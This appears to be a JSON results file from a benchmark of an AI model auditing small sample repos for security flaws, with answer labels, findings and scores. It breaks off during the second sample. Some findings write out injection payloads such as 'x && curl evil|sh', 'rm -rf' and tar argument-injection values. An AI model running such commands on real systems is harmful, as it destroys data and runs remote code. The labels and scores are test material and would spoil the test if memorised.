@@ -1,0 +1,1098 @@
+{
+  "model": "deepseek-flash",
+  "repeats": 3,
+  "tolerances": [
+    0,
+    1,
+    2,
+    3,
+    4,
+    6,
+    8
+  ],
+  "results": [
+    {
+      "sample": "s1-obvious-danger",
+      "tier": "L1 基础",
+      "style": "标准口径",
+      "goal": "审查这个仓库中的缺陷，重点是会导致错误行为、资源泄漏或安全问题的实现。逐文件检查，确认后记录发现。",
+      "audit_root": "examples\\s1-obvious-danger\\repo",
+      "labels": [
+        {
+          "code": "SEC013-a",
+          "file": "app/hooks.py",
+          "line": 6,
+          "description": "exec 在任意输入上执行"
+        },
+        {
+          "code": "SEC010-a",
+          "file": "app/settings.py",
+          "line": 5,
+          "description": "生产凭据硬编码在源码里"
+        },
+        {
+          "code": "SEC010-b",
+          "file": "app/settings.py",
+          "line": 6,
+          "description": "数据库口令同样硬编码"
+        },
+        {
+          "code": "SEC011-a",
+          "file": "app/settings.py",
+          "line": 14,
+          "description": "外部输入拼进 shell 命令，可注入"
+        },
+        {
+          "code": "SEC012-a",
+          "file": "app/settings.py",
+          "line": 19,
+          "description": "eval 执行任意表达式"
+        }
+      ],
+      "rule": {
+        "findings": 3,
+        "recall": 0.6,
+        "precision": 1.0,
+        "f1": 0.75,
+        "found": [
+          "SEC013-a@ app/hooks.py:6",
+          "SEC010-b@ app/settings.py:6",
+          "SEC012-a@ app/settings.py:19"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "elapsed": 67.8,
+          "iterations": 8,
+          "stop_reason": "finished",
+          "summary": "## 覆盖范围\n\n工作区实际只有 2 个文件（`app/hooks.py` 14 行、`app/settings.py` 19 行），无子目录、无测试、无调用方。我用 `list_files`/`grep` 交叉确认了这一点（对 `shlex|quote|sanitiz|escape|SECRET|getenv|environ|os\\.` 全文检索为 0 匹配，对 `def |class ` 的结果也仅覆盖这两个文件），并逐行读完了两个文件，因此可以判定这两份代码的缺陷面已被完整覆盖。\n\n需要说明：环境里的 `git diff` 指向的是另一套代码（`backend/eval/dataset.py`、`backend/harness/server.py`、`backend/tests/test_harness.py`），这些路径在本沙箱中不存在（`read_file` 返回 FileNotFound），所以那次 diff 我无法审计，本次结论只针对工作区内真实存在的两个文件。此外 `run_command` 因高风险权限未开启而被拒绝，结论全部来自静态阅读，不是运行时验证。\n\n## 发现（4 条，全部 blocker）\n\n1. **`app/settings.py:19`** — `expand_rule` 直接 `eval(expression)`，入参按文档说明来自运维配置，属",
+          "warnings": [
+            "运行中发生 2 次工具失败：\n- read_file: FileNotFound - 文件不存在：backend/eval/dataset.py\n- run_command: HighRiskBlocked - `run_command` 属于高风险工具，当前运行未开启高风险权限。",
+            "有 1 次工具调用被护栏拒绝。"
+          ],
+          "usage": {
+            "prompt": 65939,
+            "completion": 10561,
+            "cached": 54400
+          },
+          "cache_hit": 0.825,
+          "findings": [
+            {
+              "file": "app/settings.py",
+              "line": 19,
+              "severity": "blocker",
+              "title": "expand_rule 对运维配置里的表达式直接 eval，等于任意代码执行",
+              "detail": "`expand_rule(expression)` 把入参原样交给内置 `eval`，没有任何语法白名单、AST 校验或受限 globals。文档字符串说明入参来自「运维配置」，即外部可控数据。凡能写入该配置的人（或被注入进配置的字符串）都可以让进程执行任意 Python：`__import__('os').system(...)`、读写文件、发起外连。触发条件仅是「配置里的表达式不是纯字面量」——不需要任何额外前提，因此按 blocker 定级。",
+              "evidence": "app/settings.py:17-19\n```\ndef expand_rule(expression: str) -> object:\n    \"\"\"把运维配置里的表达式求值成实际值。\"\"\"\n    return eval(expression)\n```"
+            },
+            {
+              "file": "app/settings.py",
+              "line": 13,
+              "severity": "blocker",
+              "title": "run_backup 用 shell=True 拼接未转义参数，存在命令注入",
+              "detail": "命令行由字符串手工拼接后交给 `subprocess.check_output(..., shell=True)`，`target` 未做任何转义或引号包裹。当 `target` 由调用方/配置传入且包含 `;`、`&&`、`|`、`$()`、反引号等 shell 元字符时，会以当前进程权限执行额外命令（例如 `target = \"/data; rm -rf /backup\"`）。因为走的是 shell，注入不需要特殊条件即可成型，定级 blocker。附带问题：check_output 未捕获异常，tar 失败时会向上抛 CalledProcessError，调用方若无处理会中断备份流程。",
+              "evidence": "app/settings.py:13-14\n```\n    cmd = \"tar -czf /backup/snapshot.tgz \" + target\n    return subprocess.check_output(cmd, shell=True).decode()\n```"
+            },
+            {
+              "file": "app/settings.py",
+              "line": 5,
+              "severity": "blocker",
+              "title": "生产部署密钥与数据库口令硬编码在源码中",
+              "detail": "`DEPLOY_KEY` 与 `DB_PASSWORD` 以明文常量写在模块顶层，变量名带 `prod_live` / `prod` 前缀，表明是生产凭据。任何能读到该仓库或该文件的人（含打包产物、镜像层、日志中打印模块内容）都直接获得部署密钥与数据库口令；且无法在不改代码的情况下轮换。全局检索确认仓库内没有任何从环境变量读取的实现（`os.environ`/`getenv` 均无匹配），因此不存在「此处只是后备值」的解释。",
+              "evidence": "app/settings.py:5-6\n```\nDEPLOY_KEY = \"prod_live_7f3a9c2e4b8d1f6a24c5\"\nDB_PASSWORD = \"pg_prod_9x2kQ7mZ\"\n```\n全文检索 `getenv|environ|os\\.` 在这两个文件里 0 匹配，说明没有环境变量读取路径。"
+            },
+            {
+              "file": "app/hooks.py",
+              "line": 6,
+              "severity": "blocker",
+              "title": "apply_hook 直接 exec 插件代码，且复用调用方传入的 namespace",
+              "detail": "`apply_hook` 把插件代码字符串交给 `exec(code, namespace)`，没有沙箱、没有内置函数白名单、没有超时或资源限制。函数签名与文档字符串明确说明这是「用户提供的钩子代码」，即不受信任的输入，因此等于把任意代码执行能力开放给插件作者：可读写文件、发起网络请求、篡改进程状态。另外 `namespace` 由调用方传入并在 exec 后原样返回，插件可以覆盖/注入调用方字典中的既有键（例如替换掉调用方依赖的函数名），使调用方在后续逻辑中调用到被插件替换的实现——这一影响取决于调用方如何使用返回值，属于同一处缺陷的放大路径。",
+              "evidence": "app/hooks.py:4-7\n```\ndef apply_hook(code: str, namespace: dict) -> dict:\n    \"\"\"执行一段用户提供的钩子代码。\"\"\"\n    exec(code, namespace)\n    return namespace\n```"
+            }
+          ],
+          "matched": 4,
+          "missed": [
+            "SEC010-b app/settings.py:6"
+          ],
+          "missed_detail": [
+            {
+              "code": "SEC010-b",
+              "file": "app/settings.py",
+              "line": 6,
+              "description": "数据库口令同样硬编码",
+              "nearest_prediction": {
+                "file": "app/settings.py",
+                "line": 5,
+                "severity": "blocker",
+                "title": "生产部署密钥与数据库口令硬编码在源码中",
+                "detail": "`DEPLOY_KEY` 与 `DB_PASSWORD` 以明文常量写在模块顶层，变量名带 `prod_live` / `prod` 前缀，表明是生产凭据。任何能读到该仓库或该文件的人（含打包产物、镜像层、日志中打印模块内容）都直接获得部署密钥与数据库口令；且无法在不改代码的情况下轮换。全局检索确认仓库内没有任何从环境变量读取的实现（`os.environ`/`getenv` 均无匹配），因此不存在「此处只是后备值」的解释。",
+                "evidence": "app/settings.py:5-6\n```\nDEPLOY_KEY = \"prod_live_7f3a9c2e4b8d1f6a24c5\"\nDB_PASSWORD = \"pg_prod_9x2kQ7mZ\"\n```\n全文检索 `getenv|environ|os\\.` 在这两个文件里 0 匹配，说明没有环境变量读取路径。"
+              },
+              "distance": 1
+            }
+          ],
+          "spurious": [],
+          "spurious_detail": [],
+          "duplicates": [],
+          "precision": 1.0,
+          "recall": 0.8,
+          "f1": 0.889,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.75,
+              "recall": 0.6,
+              "f1": 0.667,
+              "spurious": 1,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            }
+          }
+        },
+        {
+          "run": 2,
+          "elapsed": 33.6,
+          "iterations": 8,
+          "stop_reason": "finished",
+          "summary": "仓库仅含 2 个 Python 文件（app/settings.py 19 行、app/hooks.py 14 行），我已逐行读完并用 grep 确认了仓内所有函数/常量的引用点（无其他调用方、无测试文件、无配置文件），因此覆盖范围是全量的。git 历史为空（HEAD~5 不存在），无法按 diff 缩小范围，故按整仓库审计。\n\n共记录 5 条发现：\n\nblocker：\n1. app/settings.py:13 —— run_backup 把外部 target 字符串拼接进命令后以 shell=True 执行（L14），存在命令注入；target 以 `-` 开头还会造成 tar 参数注入。\n2. app/settings.py:19 —— expand_rule 对配置表达式直接 eval，无受限 globals，等同任意代码执行（利用 docstring 与 L5-L6 的密钥可完全验证其危害）。\n3. app/settings.py:5-6 —— 生产级 DEPLOY_KEY / DB_PASSWORD 明文硬编码在源码中。\n\nwarn：\n4. app/hooks.py:6 —— apply_hook 按 docstring 执行「用户提供的代码」，但未限制 builtins、无沙箱，属任意代码执行面；因信任边界未在仓内体现，定为 warn 而非 blocker。\n\nnot",
+          "warnings": [],
+          "usage": {
+            "prompt": 47989,
+            "completion": 4990,
+            "cached": 40192
+          },
+          "cache_hit": 0.838,
+          "findings": [
+            {
+              "file": "app/settings.py",
+              "line": 13,
+              "severity": "blocker",
+              "title": "target 直接拼接进 shell 命令，存在命令注入",
+              "detail": "run_backup 把外部传入的 target 用字符串拼接进命令，并在第 14 行以 shell=True 执行。shell 会先解释元字符，因此 target 中含 `;`、`&&`、`|`、`$(...)`、反引号等即可执行任意命令；target 以 `-` 开头时还会被 tar 当作选项（参数注入），例如 `--checkpoint-action=exec=...` 也可造成代码执行。任何调用方只要把用户/配置可控的路径传进来就会触发。",
+              "evidence": "app/settings.py:13 `cmd = \"tar -czf /backup/snapshot.tgz \" + target`，第 14 行 `return subprocess.check_output(cmd, shell=True).decode()`；target 未经任何校验、转义或引号包裹。"
+            },
+            {
+              "file": "app/settings.py",
+              "line": 19,
+              "severity": "blocker",
+              "title": "expand_rule 对表达式直接 eval，等同任意代码执行",
+              "detail": "docstring 说明该函数用于「把运维配置里的表达式求值成实际值」，即输入来自配置文件而非代码常量。eval 以内置 builtins 为作用域，传入 `__import__('os').system('...')` 之类的表达式即可执行任意命令、读取任意文件（例如读取同文件第 5-6 行的密钥）。该函数没有任何白名单或受限 globals，因此只要配置内容可被非完全可信方影响就是 RCE。",
+              "evidence": "app/settings.py:17-19 `def expand_rule(expression: str) -> object: ... return eval(expression)`，无 globals/locals 限制，无输入校验。"
+            },
+            {
+              "file": "app/settings.py",
+              "line": 5,
+              "severity": "blocker",
+              "title": "生产部署密钥与数据库口令以明文硬编码在源码中",
+              "detail": "模块顶层以明文硬编码了生产密钥 DEPLOY_KEY 与数据库口令 DB_PASSWORD。任何能读到该模块或该仓库的人（包括上面 expand_rule 求值得到的代码）都能直接拿到凭证，且这类常量会随源码进入版本历史、镜像层与日志，无法通过轮换单一位置来收敛。",
+              "evidence": "app/settings.py:5 `DEPLOY_KEY = \"prod_live_7f3a9c2e4b8d1f6a24c5\"`；app/settings.py:6 `DB_PASSWORD = \"pg_prod_9x2kQ7mZ\"`。变量名前缀 `prod_`/`pg_prod_` 表明是生产环境凭据。"
+            },
+            {
+              "file": "app/hooks.py",
+              "line": 6,
+              "severity": "warn",
+              "title": "apply_hook 无沙箱地 exec 外部钩子代码",
+              "detail": "docstring 明确说明参数是「用户提供的钩子代码」，但实现直接 exec，且未限制 builtins（未传入受控的 `__builtins__` 白名单）。传入代码可 import os、读写文件、发起网络请求，因此一旦钩子来源不完全可信，就是任意代码执行；同时 exec 的异常会原样上抛，缺少可读的错误包装。若该函数确实只用于加载本地受信任插件，应在文档/调用处明确边界；否则需要隔离执行（子进程 + 受限权限/沙箱）。",
+              "evidence": "app/hooks.py:4-7 `def apply_hook(code: str, namespace: dict) -> dict:` / `\"\"\"执行一段用户提供的钩子代码。\"\"\"` / `exec(code, namespace)` / `return namespace`，全程无输入校验、无 builtins 限制。"
+            },
+            {
+              "file": "app/hooks.py",
+              "line": 13,
+              "severity": "note",
+              "title": "render_hint 的多次 replace 会让值中的占位符被二次展开",
+              "detail": "替换是逐键原地进行的，先替换进去的值会参与后续轮次的匹配。若某个 value 自身含有 `{{other_key}}` 形式的文本（例如用户提交的内容），且 other_key 在 values 中出现在它之后（dict 按插入序迭代），该占位符会被再次展开，把本不该出现在此处的值注入进结果。示例：`render_hint(\"{{a}}\", {\"a\": \"{{b}}\", \"b\": \"secret\"})` 返回 `\"secret\"` 而不是 `\"{{b}}\"`。触发条件是值的迭代顺序靠前且其内容包含后序键的占位符。",
+              "evidence": "app/hooks.py:12-14 `for key, value in values.items(): template = template.replace(\"{{\" + key + \"}}\", str(value))` —— 对不断更新的 template 反复整串替换，未做转义或单次遍历。"
+            }
+          ],
+          "matched": 4,
+          "missed": [
+            "SEC010-b app/settings.py:6"
+          ],
+          "missed_detail": [
+            {
+              "code": "SEC010-b",
+              "file": "app/settings.py",
+              "line": 6,
+              "description": "数据库口令同样硬编码",
+              "nearest_prediction": {
+                "file": "app/settings.py",
+                "line": 5,
+                "severity": "blocker",
+                "title": "生产部署密钥与数据库口令以明文硬编码在源码中",
+                "detail": "模块顶层以明文硬编码了生产密钥 DEPLOY_KEY 与数据库口令 DB_PASSWORD。任何能读到该模块或该仓库的人（包括上面 expand_rule 求值得到的代码）都能直接拿到凭证，且这类常量会随源码进入版本历史、镜像层与日志，无法通过轮换单一位置来收敛。",
+                "evidence": "app/settings.py:5 `DEPLOY_KEY = \"prod_live_7f3a9c2e4b8d1f6a24c5\"`；app/settings.py:6 `DB_PASSWORD = \"pg_prod_9x2kQ7mZ\"`。变量名前缀 `prod_`/`pg_prod_` 表明是生产环境凭据。"
+              },
+              "distance": 1
+            }
+          ],
+          "spurious": [
+            {
+              "file": "app/hooks.py",
+              "line": 13,
+              "severity": "note",
+              "title": "render_hint 的多次 replace 会让值中的占位符被二次展开",
+              "detail": "替换是逐键原地进行的，先替换进去的值会参与后续轮次的匹配。若某个 value 自身含有 `{{other_key}}` 形式的文本（例如用户提交的内容），且 other_key 在 values 中出现在它之后（dict 按插入序迭代），该占位符会被再次展开，把本不该出现在此处的值注入进结果。示例：`render_hint(\"{{a}}\", {\"a\": \"{{b}}\", \"b\": \"secret\"})` 返回 `\"secret\"` 而不是 `\"{{b}}\"`。触发条件是值的迭代顺序靠前且其内容包含后序键的占位符。",
+              "evidence": "app/hooks.py:12-14 `for key, value in values.items(): template = template.replace(\"{{\" + key + \"}}\", str(value))` —— 对不断更新的 template 反复整串替换，未做转义或单次遍历。"
+            }
+          ],
+          "spurious_detail": [
+            {
+              "probe": {
+                "file": "app/hooks.py",
+                "line": 13,
+                "severity": "note",
+                "title": "render_hint 的多次 replace 会让值中的占位符被二次展开",
+                "detail": "替换是逐键原地进行的，先替换进去的值会参与后续轮次的匹配。若某个 value 自身含有 `{{other_key}}` 形式的文本（例如用户提交的内容），且 other_key 在 values 中出现在它之后（dict 按插入序迭代），该占位符会被再次展开，把本不该出现在此处的值注入进结果。示例：`render_hint(\"{{a}}\", {\"a\": \"{{b}}\", \"b\": \"secret\"})` 返回 `\"secret\"` 而不是 `\"{{b}}\"`。触发条件是值的迭代顺序靠前且其内容包含后序键的占位符。",
+                "evidence": "app/hooks.py:12-14 `for key, value in values.items(): template = template.replace(\"{{\" + key + \"}}\", str(value))` —— 对不断更新的 template 反复整串替换，未做转义或单次遍历。"
+              },
+              "nearest_label": {
+                "code": "SEC013-a",
+                "file": "app/hooks.py",
+                "line": 6
+              },
+              "distance": 7,
+              "in_same_file": true
+            }
+          ],
+          "duplicates": [],
+          "precision": 0.8,
+          "recall": 0.8,
+          "f1": 0.8,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.6,
+              "recall": 0.6,
+              "f1": 0.6,
+              "spurious": 2,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 0.8,
+              "recall": 0.8,
+              "f1": 0.8,
+              "spurious": 1,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 0.8,
+              "recall": 0.8,
+              "f1": 0.8,
+              "spurious": 1,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "3": {
+              "precision": 0.8,
+              "recall": 0.8,
+              "f1": 0.8,
+              "spurious": 1,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "4": {
+              "precision": 0.8,
+              "recall": 0.8,
+              "f1": 0.8,
+              "spurious": 1,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "6": {
+              "precision": 0.8,
+              "recall": 0.8,
+              "f1": 0.8,
+              "spurious": 1,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 1
+            }
+          }
+        },
+        {
+          "run": 3,
+          "elapsed": 36.9,
+          "iterations": 6,
+          "stop_reason": "finished",
+          "summary": "审计范围：本次审计根为 backend/examples/s1-obvious-danger/repo，工作区内仅有 app/hooks.py（14 行）与 app/settings.py（19 行）两个文件，已逐行完整读完，无子目录或其他文件（list_files 全量枚举确认）。仓库外层 harness 的改动（backend/eval/dataset.py、backend/harness/server.py、backend/tests 等）不在审计根内，未纳入判定。\n\n主要发现 4 条：\n1. blocker — app/settings.py:5-6 生产部署密钥与数据库口令明文硬编码在模块顶层。\n2. blocker — app/settings.py:13-14 target 字符串拼接进命令且 shell=True，构成命令注入。\n3. blocker — app/settings.py:19 eval(expression) 对运维配置表达式做通用求值，等于任意代码执行。\n4. warn — app/hooks.py:6 exec(code, namespace) 直接执行「用户提供的钩子代码」，无来源与内容校验，且会就地污染调用方命名空间。\n\n未发现问题的部分：app/hooks.py:10-14 的 render_hint 仅做字符串 replace，模板占位符",
+          "warnings": [
+            "运行中发生 1 次工具失败：\n- read_file: PathEscape - 路径越出工作区：C:\\Users\\34442\\AppData\\Local\\Temp\\margin-harness\\git-diff.txt -> C:\\Users\\34442\\AppData\\Local\\Temp\\margin-harnes"
+          ],
+          "usage": {
+            "prompt": 38838,
+            "completion": 5429,
+            "cached": 32384
+          },
+          "cache_hit": 0.834,
+          "findings": [
+            {
+              "file": "app/settings.py",
+              "line": 5,
+              "severity": "blocker",
+              "title": "生产凭据硬编码在源码中",
+              "detail": "模块顶层直接把生产环境的部署密钥与数据库口令写成字面量常量，任何能读到该文件的人（源码分发、镜像层、日志、代码托管）都拿到明文凭据；凭据随代码一起进版本库后无法靠轮换之外的任何手段收回。",
+              "evidence": "L5: DEPLOY_KEY = \"prod_live_7f3a9c2e4b8d1f6a24c5\"；L6: DB_PASSWORD = \"pg_prod_9x2kQ7mZ\"（\"prod_\" 前缀表明是生产凭据，非测试占位值）。"
+            },
+            {
+              "file": "app/settings.py",
+              "line": 13,
+              "severity": "blocker",
+              "title": "shell=True 拼接 target 导致命令注入",
+              "detail": "target 被直接字符串拼接到命令中，再交给 shell=True 执行。只要 target 来自外部输入（CLI 参数、配置文件、调用方传入），攻击者用类似 `x; rm -rf /` 或 `x && curl evil|sh` 的值即可在宿主机上执行任意命令。该函数本身还以固定路径 /backup/snapshot.tgz 作为输出，说明它运行在具备备份盘挂载权限的环境里，注入后果不止于普通用户权限。",
+              "evidence": "L13: cmd = \"tar -czf /backup/snapshot.tgz \" + target；L14: return subprocess.check_output(cmd, shell=True).decode()。"
+            },
+            {
+              "file": "app/settings.py",
+              "line": 19,
+              "severity": "blocker",
+              "title": "eval 直接求值外部表达式，等于任意代码执行",
+              "detail": "expression 被原样交给 eval，注释说明它来自「运维配置里的表达式」。eval 并不限于算术，`__import__(\"os\").system(...)`、读写文件等都能执行，因此凡是能改动该配置的地方都获得了与部署工具同等的执行权限；而该模块同文件内就持有生产凭据，被利用后可一并窃取。触发条件：表达式来自可被外部写入的配置。",
+              "evidence": "L17-19: def expand_rule(expression: str) -> object: ... return eval(expression)。"
+            },
+            {
+              "file": "app/hooks.py",
+              "line": 6,
+              "severity": "warn",
+              "title": "exec 执行调用方提供的代码，未做任何来源校验",
+              "detail": "apply_hook 把外部传入的 code 直接 exec 进调用方的 namespace。函数注释称这是「用户提供的钩子代码」，若钩子来自可写配置目录、插件包或网络，则等价于在本进程内执行任意代码；且 namespace 是调用方传入的，exec 会就地污染该命名空间（可覆盖调用方的名字），影响面超出钩子自身。仅当钩子代码完全受信且不可被第三方改写时，风险才可控。",
+              "evidence": "L4-7: def apply_hook(code: str, namespace: dict) -> dict: ... exec(code, namespace) ... return namespace；L5 注释「执行一段用户提供的钩子代码」，但函数体内没有任何来源/内容校验。"
+            }
+          ],
+          "matched": 4,
+          "missed": [
+            "SEC010-b app/settings.py:6"
+          ],
+          "missed_detail": [
+            {
+              "code": "SEC010-b",
+              "file": "app/settings.py",
+              "line": 6,
+              "description": "数据库口令同样硬编码",
+              "nearest_prediction": {
+                "file": "app/settings.py",
+                "line": 5,
+                "severity": "blocker",
+                "title": "生产凭据硬编码在源码中",
+                "detail": "模块顶层直接把生产环境的部署密钥与数据库口令写成字面量常量，任何能读到该文件的人（源码分发、镜像层、日志、代码托管）都拿到明文凭据；凭据随代码一起进版本库后无法靠轮换之外的任何手段收回。",
+                "evidence": "L5: DEPLOY_KEY = \"prod_live_7f3a9c2e4b8d1f6a24c5\"；L6: DB_PASSWORD = \"pg_prod_9x2kQ7mZ\"（\"prod_\" 前缀表明是生产凭据，非测试占位值）。"
+              },
+              "distance": 1
+            }
+          ],
+          "spurious": [],
+          "spurious_detail": [],
+          "duplicates": [],
+          "precision": 1.0,
+          "recall": 0.8,
+          "f1": 0.889,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.75,
+              "recall": 0.6,
+              "f1": 0.667,
+              "spurious": 1,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 0
+            }
+          }
+        }
+      ]
+    },
+    {
+      "sample": "s6-authz-logic",
+      "tier": "L6 高级",
+      "style": "诊断型（先建模型）",
+      "goal": "先建立这个服务的权限模型与订单状态机，再逐一判断实现有没有落实它。重点是：谁能看到什么、哪些状态转换是允许的。",
+      "audit_root": "examples\\s6-authz-logic\\repo",
+      "labels": [
+        {
+          "code": "AUTHZ01-a",
+          "file": "app/orders.py",
+          "line": 12,
+          "description": "只按 order_id 查询，未校验 order 归属（越权读取他人订单）"
+        },
+        {
+          "code": "AUTHZ02-a",
+          "file": "app/orders.py",
+          "line": 19,
+          "description": "只拦「已发货」，已退款/已完成的订单仍可取消并触发二次退款"
+        },
+        {
+          "code": "AUTHZ03-a",
+          "file": "app/orders.py",
+          "line": 25,
+          "description": "全局权限直接放行，静默覆盖了 CLIENT_DENY 里配的逐 client 拒绝"
+        },
+        {
+          "code": "AUTHZ04-a",
+          "file": "app/orders.py",
+          "line": 30,
+          "description": "未校验 amount 是否超过实付金额，也未校验是否已退过款"
+        }
+      ],
+      "rule": {
+        "findings": 0,
+        "recall": 0.0,
+        "precision": 0.0,
+        "f1": 0.0,
+        "found": []
+      },
+      "runs": [
+        {
+          "run": 1,
+          "elapsed": 53.8,
+          "iterations": 8,
+          "stop_reason": "finished",
+          "summary": "审计范围：工作区（审计根）内仅有一个被测文件 `app/orders.py`（31 行），我已逐行读完它并覆盖了 `OrderService` 的全部 4 个方法。`git diff` 显示的另一处改动位于 `backend/eval/dataset.py` 等，属于外层评测 harness 仓库、不在审计根内，故未纳入。由于该样本没有 `repo/` 子目录，按 harness 的兼容规则样本目录本身即审计根，判断没有遗漏文件。\n\n一、先建立的模型（从代码自身意图反推）\n- 权限模型：文件顶部定义 `VIEW_PERMISSIONS`（用户→权限级别）与 `CLIENT_DENY`（用户→不可见的 client 集合），并提供了 `can_view`，说明设计意图是「按 client 维度做观看授权 + 显式 deny 名单」。\n- 状态机：`cancel` 中显式拒绝 `shipped`，说明订单只有部分前置状态可被取消。\n\n二、主要发现（4 blocker / 1 warn / 1 note）\n1. blocker `app/orders.py:11` get_order 收下 `user_id` 却从不使用，直接 `ORDERS.get(order_id)` 返回，存在 IDOR 越权读；`can_view` 全文无任何调用点（grep 仅命中定义处 L22）。\n2. bl",
+          "warnings": [],
+          "usage": {
+            "prompt": 54334,
+            "completion": 8298,
+            "cached": 47104
+          },
+          "cache_hit": 0.867,
+          "findings": [
+            {
+              "file": "app/orders.py",
+              "line": 11,
+              "severity": "blocker",
+              "title": "get_order 完全不校验 user_id，任意用户可读任意订单（越权读）",
+              "detail": "函数签名接收 user_id，但函数体内只用 order_id 查表后直接返回，user_id 从未被使用，也没有调用类内已有的 can_view。因此只要知道 order_id，任何 user_id（包括不存在/未授权的用户）都能拿到订单详情，构成 IDOR。文件顶部定义了 VIEW_PERMISSIONS / CLIENT_DENY 并提供了 can_view，说明权限模型是存在的，但读路径上没有落实。",
+              "evidence": "L9 `def get_order(self, order_id: str, user_id: str) -> dict:`；L11 `order = ORDERS.get(order_id)`；L12 `return order`。全文件中 user_id 仅出现在签名里，grep `can_view` 只在 L22 定义处命中，无任何调用点。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 16,
+              "severity": "blocker",
+              "title": "cancel 不校验 user_id，任意用户可取消他人订单（越权写）",
+              "detail": "与 get_order 同源问题：cancel 接收 user_id 但只做状态判断，没有任何归属/权限校验。任意调用者只要拿到 order_id 就能把别人的订单置为 cancelled。写路径比读路径影响更大，且这里同样没有调用 can_view。",
+              "evidence": "L14 `def cancel(self, order_id: str, user_id: str) -> dict:`；L16 `order = ORDERS.get(order_id)`；L17-L19 仅判断 status 与赋值，user_id 未参与任何判断。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 26,
+              "severity": "blocker",
+              "title": "can_view 的缺省行为是放行（fail-open），权限模型无默认拒绝",
+              "detail": "非 global 的用户走 L26：`client_id not in CLIENT_DENY.get(user_id, ())`。当 user_id 在 CLIENT_DENY 中没有任何记录时，缺省值是空元组，`client_id not in ()` 恒为 True，即一律放行。于是「完全没有任何权限记录的新用户」反而可以查看任意 client 的数据，权限模型实际是一个只对显式登记的黑名单生效的白名单失效模型。这与 L24 显式授予 \"global\" 才放行的写法不对称，安全语义上应默认拒绝。",
+              "evidence": "L24 `if VIEW_PERMISSIONS.get(user_id) == \"global\": return True`；L26 `return client_id not in CLIENT_DENY.get(user_id, ())`（缺省 () → 恒 True）。L4-L5 `VIEW_PERMISSIONS = {}`、`CLIENT_DENY = {}` 均为空，说明初始数据下所有人可看所有 client。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 30,
+              "severity": "blocker",
+              "title": "refund 无金额上限与状态校验，可超额退款 / 重复退款",
+              "detail": "refund 只做累加，既不校验 order 是否处于可退款状态（如未支付 / 已全额退款 / 已取消），也不校验累计退款金额是否超过实付金额，更没有 user_id / 调用方权限参数。任何拿到 order dict 的调用方都能反复调用，把 refunded_cents 累加到远超订单金额，属于可被滥用的资金操作。",
+              "evidence": "L28 `def refund(self, order: dict, amount: int) -> dict:`；L30 `order[\"refunded_cents\"] = order[\"refunded_cents\"] + amount`；L31 `return order`。函数体内无任何 amount 上限、无 status 判断、无权限参数。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 17,
+              "severity": "warn",
+              "title": "取消的状态机只挡了 shipped 一条边，且订单不存在时抛 TypeError",
+              "detail": "状态机目前只禁止 shipped→cancelled 这一条边，其余状态（如 delivered、已 refunded、已 cancelled）都可以被直接置为 cancelled，包含「已交付订单被取消」这种逆向流转。同时当 order 不存在时，L16 得到 None，L17 的 order[\"status\"] 会抛 TypeError，把「订单不存在」这个业务错误伪装成 500 内部错误。",
+              "evidence": "L17-L18 只判断 `if order[\"status\"] == \"shipped\": raise PermissionError(\"shipped\")`，没有其他状态分支；L19 无条件 `order[\"status\"] = \"cancelled\"`；L16-L17 之间没有 `if order is None` 的判空。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 12,
+              "severity": "note",
+              "title": "get_order 对不存在的订单静默返回 None",
+              "detail": "订单 ID 不存在时返回 None 而不是抛错，调用方若按 dict 使用会得到难以定位的 TypeError / 空响应；对权限模型而言，「不可见」与「不存在」应使用同一种拒绝语义，避免通过错误类型差异枚举出系统中存在哪些订单 ID。",
+              "evidence": "L11-L12：`order = ORDERS.get(order_id)` 后无条件 `return order`，没有 `if order is None` 分支，也没有抛 KeyError/NotFound。"
+            }
